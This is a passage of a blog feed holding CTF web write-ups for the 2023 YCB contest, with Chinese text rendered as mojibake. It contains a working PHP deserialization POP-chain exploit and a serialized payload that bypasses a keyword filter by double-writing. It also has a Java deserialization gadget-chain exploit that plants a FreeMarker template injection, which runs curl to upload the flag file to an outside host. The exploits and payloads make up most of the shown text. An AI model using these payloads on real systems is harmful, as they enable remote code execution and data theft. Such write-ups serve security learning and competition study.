class="string">&#x27;post&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(response);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Cleanly exit CycleTLS</span></span><br><span class="line">  cycleTLS.<span class="title function_">exit</span>();</span><br><span class="line"></span><br><span class="line">&#125;)();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/piVrT7q"><img src="https://z1.ax1x.com/2023/10/25/piVrT7q.png" alt="piVrT7q.png"></a></p><h1 id="KarmarCTF-Web"><a href="#KarmarCTF-Web" class="headerlink" title="KarmarCTF Web"></a>KarmarCTF Web</h1><p><a href="https://imgse.com/i/piVroBn"><img src="https://z1.ax1x.com/2023/10/25/piVroBn.png" alt="piVroBn.png"></a></p>]]></content>
      
      
      <categories>
          
          <category> competition </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2023ç¾ŠåŸæ¯</title>
      <link href="/2023/09/03/YCB/"/>
      <url>/2023/09/03/YCB/</url>
      
        <content type="html"><![CDATA[<h1 id="YCB-WEB"><a href="#YCB-WEB" class="headerlink" title="YCB WEB"></a>YCB WEB</h1><h2 id="D0nâ€™t-pl4y-g4m3"><a href="#D0nâ€™t-pl4y-g4m3" class="headerlink" title="D0nâ€™t pl4y g4m3!!!"></a>D0nâ€™t pl4y g4m3!!!</h2><p>php7.4.21æºç æ³„éœ²</p><p>æ‹¿åˆ°æºç </p><p><strong>p0p.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;HTTP/1.1 302 found&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location:https://passer-by.com/pacman/&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pro</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$exp</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$rce2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="variable">$rce2</span>=<span class="variable language_">$this</span>-&gt;exp[<span class="variable">$rce2</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="string">&#x27;system&#x27;</span>, <span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Yang</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$ary</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;key === <span class="literal">true</span> || <span class="variable language_">$this</span>-&gt;finish1-&gt;name) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;finish-&gt;finish) &#123;</span><br><span class="line">                <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;now[<span class="variable">$name</span>], <span class="variable">$ary</span>[<span class="number">0</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">ycb</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;now = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;finish-&gt;finish;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key = True;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cheng</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$finish</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;name[<span class="variable">$value</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bei</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;CTF-&gt;<span class="title function_ invoke__">ycb</span>()) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;fine-&gt;<span class="title function_ invoke__">YCB1</span>(<span class="variable">$this</span>-&gt;rce, <span class="variable">$this</span>-&gt;rce1);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">prohib</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&quot;/system|exec|passthru|shell_exec|popen|proc_open|pcntl_exec|eval|flag/i&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$a</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_POST</span>[<span class="string">&quot;CTF&quot;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">prohib</span>(<span class="variable">$a</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä¸éš¾ï¼Œç®€å•æ„é€ ä¸‹å°±è¡Œï¼Œåªå–<code>Yang</code>å’Œ<code>Bei</code>ç±»å³å¯</p><p><strong>exp</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pro</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$exp</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$rce2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="variable">$rce2</span>=<span class="variable language_">$this</span>-&gt;exp[<span class="variable">$rce2</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="string">&#x27;system&#x27;</span>, <span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Yang</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$ary</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"><span class="comment">//        phpinfo();</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;key === <span class="literal">true</span> || <span class="variable language_">$this</span>-&gt;finish1-&gt;name) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;finish-&gt;finish) &#123;</span><br><span class="line"><span class="comment">//                phpinfo();</span></span><br><span class="line">                <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;now[<span class="variable">$name</span>], <span class="variable">$ary</span>[<span class="number">0</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">ycb</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"><span class="comment">//        phpinfo();</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;now = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;finish-&gt;finish;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"><span class="comment">//        phpinfo();</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key = True;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cheng</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$finish</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;name[<span class="variable">$value</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bei</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;CTF-&gt;<span class="title function_ invoke__">ycb</span>()) &#123;</span><br><span class="line"><span class="comment">//            phpinfo();</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;fine-&gt;<span class="title function_ invoke__">YCB1</span>(<span class="variable">$this</span>-&gt;rce, <span class="variable">$this</span>-&gt;rce1);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"><span class="comment">//        phpinfo();</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$bei</span> = <span class="keyword">new</span> <span class="title class_">Bei</span>();</span><br><span class="line"><span class="variable">$yang</span> = <span class="keyword">new</span> <span class="title class_">Yang</span>();</span><br><span class="line"><span class="variable">$yang2</span> = <span class="keyword">new</span> <span class="title class_">Yang</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$bei</span>-&gt;CTF = <span class="variable">$yang</span>;</span><br><span class="line"><span class="variable">$yang</span>-&gt;finish-&gt;finish = <span class="literal">true</span>;</span><br><span class="line"><span class="variable">$bei</span>-&gt;fine = <span class="variable">$yang2</span>;</span><br><span class="line"><span class="variable">$bei</span>-&gt;rce = <span class="string">&#x27;cat /tmp/catcatf1ag.txt&#x27;</span>;</span><br><span class="line"><span class="variable">$bei</span>-&gt;rce1 = <span class="string">&#x27;111&#x27;</span>;</span><br><span class="line"><span class="variable">$yang2</span>-&gt;finish-&gt;finish = <span class="literal">true</span>;</span><br><span class="line"><span class="variable">$yang2</span>-&gt;now[<span class="string">&#x27;YCB1&#x27;</span>] = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">serialize</span>(<span class="variable">$bei</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//O:3:&quot;Bei&quot;:4:&#123;s:3:&quot;CTF&quot;;O:4:&quot;Yang&quot;:1:&#123;s:6:&quot;finish&quot;;O:8:&quot;stdClass&quot;:1:&#123;s:6:&quot;finish&quot;;b:1;&#125;&#125;s:4:&quot;fine&quot;;O:4:&quot;Yang&quot;:2:&#123;s:6:&quot;finish&quot;;O:8:&quot;stdClass&quot;:1:&#123;s:6:&quot;finish&quot;;b:1;&#125;s:3:&quot;now&quot;;a:1:&#123;s:4:&quot;YCB1&quot;;s:6:&quot;system&quot;;&#125;&#125;s:3:&quot;rce&quot;;s:23:&quot;cat /tmp/catcatf1ag.txt&quot;;s:4:&quot;rce1&quot;;s:3:&quot;111&quot;;&#125;   </span></span><br></pre></td></tr></table></figure><p>å…¶ä¸­wafé‡Œç”¨çš„æ˜¯<code>preg_replace()</code>ï¼ŒåŒå†™ç»•ä¸‹å°±è¡Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">prohib</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&quot;/system|exec|passthru|shell_exec|popen|proc_open|pcntl_exec|eval|flag/i&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$a</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:3:&quot;Bei&quot;:4:&#123;s:3:&quot;CTF&quot;;O:4:&quot;Yang&quot;:1:&#123;s:6:&quot;finish&quot;;O:8:&quot;stdClass&quot;:1:&#123;s:6:&quot;finish&quot;;b:1;&#125;&#125;s:4:&quot;fine&quot;;O:4:&quot;Yang&quot;:2:&#123;s:6:&quot;finish&quot;;O:8:&quot;stdClass&quot;:1:&#123;s:6:&quot;finish&quot;;b:1;&#125;s:3:&quot;now&quot;;a:1:&#123;s:4:&quot;YCB1&quot;;s:6:&quot;syssystemtem&quot;;&#125;&#125;s:3:&quot;rce&quot;;s:23:&quot;cat /tmp/catcatf1ag.txt&quot;;s:4:&quot;rce1&quot;;s:3:&quot;111&quot;;&#125;   </span><br></pre></td></tr></table></figure><h2 id="Ez-java"><a href="#Ez-java" class="headerlink" title="Ez_java"></a>Ez_java</h2><p><code>/templating</code>è·¯ç”±ï¼Œæ ¹æ®è¿”å›çš„indexæ¥æ¨¡æ¿æ¸²æŸ“ã€‚<code>/getflag</code>è·¯ç”±æ¥æ”¶ä¼ å…¥çš„base64å­—ç¬¦ä¸²ç„¶åè¿›è¡Œååºåˆ—åŒ–</p><p><a href="https://imgse.com/i/pPHJqQH"><img src="https://z1.ax1x.com/2023/09/26/pPHJqQH.png" alt="pPHJqQH.png"></a></p><p><code>HtmlInvocationHandler</code>ç±»å®ç°äº†<code>InvocationHandler</code>æ¥å£å¹¶é‡å†™äº†å…¶invokeæ–¹æ³•ï¼Œå¯å®ç°åŠ¨æ€ä»£ç†ï¼Œåœ¨invokeé‡Œå¯è°ƒç”¨ä»£ç†å¯¹è±¡get()æ–¹æ³•<img src="https://z1.ax1x.com/2023/09/27/pPbpTUK.png" alt="pPbpTUK.png"></p><p><code>HtmlMap</code>å®ç°Mapæ¥å£ï¼Œå…¶getæ–¹æ³•è°ƒç”¨<code>HtmlUploadUtil</code>è¾¾åˆ°æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½</p><p><a href="https://imgse.com/i/pPbhZCT"><img src="https://z1.ax1x.com/2023/09/28/pPbhZCT.png" alt="pPbhZCT.png"></a></p><p>é™åˆ¶ä¸Šä¼ <code>.ftl</code>æ–‡ä»¶ï¼Œä¸º<code>freemarker</code>çš„æ¨¡æ¿æ–‡ä»¶ï¼Œå­˜åœ¨æ¨¡æ¿æ³¨å…¥ï¼Œå¯ä»¥rce</p><p><a href="https://imgse.com/i/pPbhnv4"><img src="https://z1.ax1x.com/2023/09/28/pPbhnv4.png" alt="pPbhnv4.png"></a></p><p>ä¸Šä¼ <code>index.ftl</code>è¦†ç›–åŸæœ‰<code>index.ftl</code>æ–‡ä»¶ï¼ŒåŠ¨æ€ä»£ç†Mapï¼Œç”¨<code>BadAttributeValueExpException</code>è°ƒç”¨Map.toStringä½¿å…¶æ‰§è¡Œinvokeæ–¹æ³•è§¦å‘æ–‡ä»¶ä¸Šä¼ </p><p><strong>gadget</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BadAttributeValueExpException#readObject </span><br><span class="line">Map#toString</span><br><span class="line">HtmlInvocationHandler#invoke</span><br><span class="line">HtmlMap#get</span><br><span class="line">HtmlUploadUtil#uploadfile</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œå‘½ä»¤æ²¡å›æ˜¾ï¼Œåå¼¹shellä¹Ÿå¼¹ä¸å‡ºæ¥ï¼Œç›´æ¥ç”¨curlå¤–å¸¦flag </p><p><strong>exp</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ycbjava;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ycbjava.Utils.HtmlInvocationHandler;</span><br><span class="line"><span class="keyword">import</span> com.ycbjava.Utils.HtmlMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">HtmlMap</span> <span class="variable">htmlMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HtmlMap</span>();</span><br><span class="line"></span><br><span class="line">        htmlMap.filename = <span class="string">&quot;index.ftl&quot;</span>;</span><br><span class="line">        htmlMap.content = <span class="string">&quot;&lt;!DOCTYPE html&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;html lang=\&quot;en\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;head&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;meta charset=\&quot;UTF-8\&quot;&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;#assign a=springMacroRequestContext.webApplicationContext&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;#assign b=a.getBean(&#x27;freeMarkerConfiguration&#x27;)&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;#assign c=b.getDefaultConfiguration().getNewBuiltinClassResolver()&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;#assign VOID=b.setNewBuiltinClassResolver(c)&gt;$&#123;\&quot;freemarker.template.utility.Execute\&quot;?new()(\&quot;curl x.x.x.x:2333 -F file=@/flag\&quot;)&#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;/head&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;body&gt;&lt;/body&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&lt;/html&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">pocMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(</span><br><span class="line">                exp.class.getClassLoader(),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">HtmlInvocationHandler</span>(htmlMap)</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="string">&quot;aa&quot;</span>);</span><br><span class="line">        setValue(badAttributeValueExpException,<span class="string">&quot;val&quot;</span>,pocMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(badAttributeValueExpException);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] output = Base64.getEncoder().encode(byteArrayOutputStream.toByteArray());</span><br><span class="line">        System.out.println(<span class="keyword">new</span> <span class="title class_">String</span>(output));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Serpent"><a href="#Serpent" class="headerlink" title="Serpent"></a>Serpent</h2><p>ç»™äº†app.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> secret</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/verification&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verification</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        attribute = session.get(<span class="string">&#x27;Attribute&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> 